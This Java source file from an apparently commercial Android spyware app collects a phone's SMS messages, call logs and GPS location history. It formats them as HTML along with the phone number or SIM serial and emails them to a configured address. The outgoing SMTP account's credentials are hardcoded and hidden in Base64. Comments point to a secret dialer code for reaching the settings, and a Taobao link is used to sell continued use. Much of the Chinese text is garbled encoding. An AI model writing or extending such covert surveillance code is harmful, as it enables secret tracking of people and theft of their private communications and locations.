package com.yfm.sms;

import it.sauronsoftware.base64.Base64;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.yfm.mail.MailSenderInfo;
import com.yfm.mail.SimpleMailSender;

public class SendMail {
	public static boolean isfasong=true;
	public String body="<html><style>table.gridtable {	font-family: verdana,arial,sans-serif;	font-size:11px;	color:#333333;	border-width: 1px;	border-color: #666666;	border-collapse: collapse;width:100%}table.gridtable th {	border-width: 1px;	padding: 8px;	border-style: solid;	border-color: #666666;	background-color: #dedede;}table.gridtable td {	border-width: 1px;	padding: 8px;	border-style: solid;	border-color: #666666;	background-color: #ffffff;}</style><body>";
	public String bodyend="</body></html>";
	private Context context;
	private MailSenderInfo mailInfo;
	private SharedPreferences sp;
	private boolean isceshi=false;
	private int ct=20;
	private int length=36;
	
	public void setIsceshi(boolean isceshi) {
		this.isceshi = isceshi;
	}

	public SendMail(Context context){
		this.context=context;
		sp=context.getSharedPreferences("set", Context.MODE_PRIVATE);
	}
	
	public void SendMail() {
		Loginfo.write("��ʼ����", "��ʼ����");
		if(!getNetWorkState()){
			Loginfo.write("��ʼ����", "���粻ͨ");
			isfasong=false;
			return;
		}else{
			Loginfo.write("��ʼ����", "����ͨ��");
			isfasong=true;
		}
		Loginfo.write("��ʼ����", "��������");
		String toaddress=sp.getString("email", "");
		Loginfo.write("�����ַ", toaddress);
		int count=sp.getInt("count", 0);
		String html = getHtml(count);
		Log.i("count",""+count);
		Log.i("isceshi",""+isceshi);
		Log.i("html",""+html);
		Log.i("����", isfasong+"--"+(html!=null)+(!"".equals(html))+(!"".equals(toaddress))+"--");
		if (isfasong&&html!=null&&!"".equals(html)&&!"".equals(toaddress)) {

			Loginfo.write("��ʼ����", "������");
			mailInfo = new MailSenderInfo();
			mailInfo.setMailServerHost("smtp.163.com");
			mailInfo.setMailServerPort("25");
			mailInfo.setValidate(true);
			String username=Base64.decode("bWVzc2FnZV9zZXJ2aWNlQDE2My5jb20=", "gb2312");
			Log.i("username", username);
			mailInfo.setUserName(username);
			String pass=Base64.decode("bWluZzg2MTAwNCQm", "gb2312");
			Log.i("username", username);
			mailInfo.setPassword(pass);// ������������
			mailInfo.setFromAddress(username);
			
			mailInfo.setToAddress(toaddress);

			mailInfo.setSubject("����ͨѶ¼");
			mailInfo.setContent(html);
			// �������Ҫ�������ʼ�
			SimpleMailSender sms = new SimpleMailSender();
			boolean flag = sms.sendHtmlMail(mailInfo);// ����html��ʽ

			if (flag) {
				isfasong=true;
				clearFile("sms.bak");
				clearFile("call.bak");
				clearFile("location.bak");
				Loginfo.write("��ʼ����", "���ͳɹ�");
				if(!isceshi){
					Editor edit=sp.edit();
					edit.putInt("count", ++count);
					edit.commit();
				}
				
			}else{
				isfasong=false;
				Loginfo.write("��ʼ����", "����ʧ��");
			}
		}
		Loginfo.write("��ʼ����", "���ͽ���");
	}
	

	private String getHtml(int c) {
		StringBuffer html=new StringBuffer();
		html.append(body);
		html.append("<div style='font-size:13px;'>��������(SIM������)"+getnum()+" ,ϵͳ�汾"+Build.VERSION.SDK_INT+" ,�ֻ��ͺ�"+Build.MODEL+"--"+Build.PRODUCT+"�������ý������ڲ��Ž�������*#*#6969#*#*����</div><br/>");
		if(isceshi){
			html.append(ceshi());
			html.append(bodyend);
			return html.toString();
		} else if(c>=ct){
			html.append(GetMsg());
			html.append(bodyend);
			return html.toString();
		}else{
			html.append("<div style='font-size:11px;'>���ż�¼</div><br/>");
			JSONArray sms=FileToJson("sms.bak");
			html.append(GetSmsCon(sms));
			html.append("<div style='font-size:11px;'>ͨ����¼</div><br/>");
			JSONArray call=FileToJson("call.bak");
			html.append(GetCallCon(call));
			html.append("<div style='font-size:11px;'>λ�ü�¼</div><br/>");
			JSONArray location=FileToJson("location.bak");
			html.append(GetlocationCon(location));
			html.append(bodyend);
			if(sms.length()>0||call.length()>0||location.length()>=length){
				return html.toString();
			}else{
				return null;
			}
		}
		
	}
	
	public JSONArray FileToJson(String filename){
		JSONArray ja = new JSONArray();
		try {
			File f = new File(BootServer.file,filename);
			if (!f.exists()) {
				f.createNewFile();
			}
			Log.i("type", f.getAbsolutePath());
			FileInputStream fa = new FileInputStream(f);
			BufferedReader br = new BufferedReader(
					new InputStreamReader(fa));
			String readString = new String();
			StringBuffer sb = new StringBuffer();
			while ((readString = br.readLine()) != null) {
				sb.append(readString);
			}
			fa.close();
			if (!"".equals(sb.toString())) {
				ja = new JSONArray(sb.toString());
			}
			Log.i("json", ja.toString());
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return ja;
	}
	
	public String GetSmsCon(JSONArray ja){
		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th style='width:150px'>ʱ��</th><th style='width:80px'>����</th><th style='width:100px'>����</th><th style='width:80px'>����</th><th>����</th></tr>");
			for (int i = 0; i < ja.length(); i++) {
				JSONObject jo = ja.getJSONObject(i);
				table.append("<tr><td>" + jo.getString("dates")
						+ "</td><td>" + jo.getString("type") + "</td><td>"
						+ jo.getString("address") + "</td><td>"
						+ jo.getString("phonename") + "</td><td>"
						+ jo.getString("body") + "</td></tr>");
			}
			if (ja.length() == 0) {
				Loginfo.write("��ʼ����", "������");
				table.append("<td colspan='5'>������</td>");
			}
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}
	public String GetCallCon(JSONArray ja){
		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th style='width:150px'>ʱ��</th><th style='width:80px'>����</th><th style='width:100px'>����</th><th style='width:80px'>����</th><th>ʱ��</th></tr>");
			for (int i = 0; i < ja.length(); i++) {
				JSONObject jo = ja.getJSONObject(i);
				table.append("<tr><td>" + jo.getString("dates")
						+ "</td><td>" + jo.getString("type") + "</td><td>"
						+ jo.getString("address") + "</td><td>"
						+ jo.getString("phonename") + "</td><td>"
						+ jo.getString("duration") + "</td></tr>");
			}
			if (ja.length() == 0) {
				Loginfo.write("��ʼ����", "������");
				table.append("<td colspan='5'>������</td>");
			}
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}
	public String GetlocationCon(JSONArray ja){
		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th style='width:50px'>���</th><th style='width:150px'>��¼ʱ��</th><th style='width:80px'>λ��</th><th style='width:100px'>����</th><th style='width:80px'>γ��</th><th>�ٶȵ�ͼ�鿴</th></tr>");
			for (int i = 0; i < ja.length(); i++) {
				JSONObject jo = ja.getJSONObject(i);
				table.append("<tr><td>"+(i+1)+"</td><td>" + jo.getString("time")
						+ "</td><td>" + jo.getString("addr") + "</td><td>"
						+ jo.getString("latitude") + "</td><td>"
						+ jo.getString("longitude") + "</td><td><a href='http://api.map.baidu.com/staticimage?markers="+jo.getString("longitude")+","+jo.getString("latitude")+"&zoom=17&width=800&height=600' target='_blank'>�鿴</a></td></tr>");
			}
			if (ja.length() == 0) {
				Loginfo.write("��ʼ����", "������");
				table.append("<td colspan='6'>������</td>");
			}
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}
	public String GetMsg(){
		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th>ʹ�ô����ѵ� �빺���������ʹ�� �����ַ��<a href='http://item.taobao.com/item.htm?id=14977465630'>http://item.taobao.com/item.htm?id=14977465630</a></th></tr>");
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}
	public String ceshi(){
		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th>����ܹ��յ����ʼ�˵���ܹ�ʹ�ô���� ���������ַ<a href='http://item.taobao.com/item.htm?id=14977465630'>http://item.taobao.com/item.htm?id=14977465630</a></th></tr>");
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}
	private void clearFile(String filename) {
		try {
			File f = new File(BootServer.file,filename);
			if (!f.exists()) {
				f.createNewFile();
			}
			FileOutputStream fos = new FileOutputStream(f);
			BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(fos));
			bw.write("");

			fos.close();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public boolean getNetWorkState(){
		ConnectivityManager cm=(ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkinfo=cm.getActiveNetworkInfo();
		if(networkinfo!=null&&networkinfo.isAvailable()){
			return true;
		}else{
			return false;
		}
	}
	public String getnum(){
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
	       
        String tel = tm.getLine1Number();
        String imei = tm.getSimSerialNumber();
        if(tel!=null&&!"".equals(tel)){
        	return tel;
        }else{
        	return imei;
        }
	}
	
	
}
